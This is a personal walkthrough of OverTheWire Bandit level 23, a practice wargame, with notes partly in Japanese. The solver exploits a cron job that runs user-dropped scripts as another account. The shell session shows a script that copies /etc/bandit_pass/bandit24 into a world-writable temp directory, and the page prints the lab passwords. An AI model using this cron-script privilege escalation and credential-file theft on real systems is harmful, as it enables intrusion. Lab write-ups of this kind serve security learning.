## Bandit_23

Bandit Level 23 → Level 24

Level Goal

A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

Commands you may need to solve this level

chmod, cron, crontab, crontab(5) (use “man 5 crontab” to access this)

## Solution

```Pass
gKXDTAXnIz3OBxiPjRZ2uqutUlPZrBsw
```

```bash
bandit23@bandit:~$ cd /etc/cron.d
bandit23@bandit:/etc/cron.d$ la
.placeholder       cronjob_bandit24
behemoth4_cleanup  e2scrub_all
clean_tmp          leviathan5_cleanup
cronjob_bandit22   manpage3_resetpw_job
cronjob_bandit23   otw-tmp-dir
```

```Bash
bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```

```bash
bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh 
#!/bin/bash

shopt -s nullglob

myname=$(whoami)

cd /var/spool/"$myname"/foo || exit 
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." ] && [ "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" "./$i")"
        if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
            timeout -s 9 60 "./$i"
        fi
        rm -rf "./$i"
    fi
```

```bash
bandit23@bandit:~$ mktemp -d
/tmp/tmp.AVI4pur28P
```

```bash
bandit23@bandit:~$ touch a.sh
bandit23@bandit:~$ vim a.sh
```

a.shを編集
Pass24にパスワードを書き込む
```bash
cat /etc/bandit_pass/bandit24 > /tmp/tmp.AVI4pur28P/pass24
```

一応全権限を付与
```bash
bandit23@bandit:/tmp/tmp.AVI4pur28P$ chmod 777 /tmp/tmp.AVI4pur28P
bandit23@bandit:/tmp/tmp.AVI4pur28P$ chmod 777 a.sh
```

fooにコピー
```Bash
bandit23@bandit:/tmp/tmp.AVI4pur28P$ cp a.sh /var/spool/bandit24/foo/
```

Pass24が作成された
```bash
bandit23@bandit:/tmp/tmp.AVI4pur28P$ ls
a.sh  cronjob_bandit24.sh  pass  pass24
```

```bash
bandit23@bandit:/tmp/tmp.AVI4pur28P$ cat pass24
hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv
```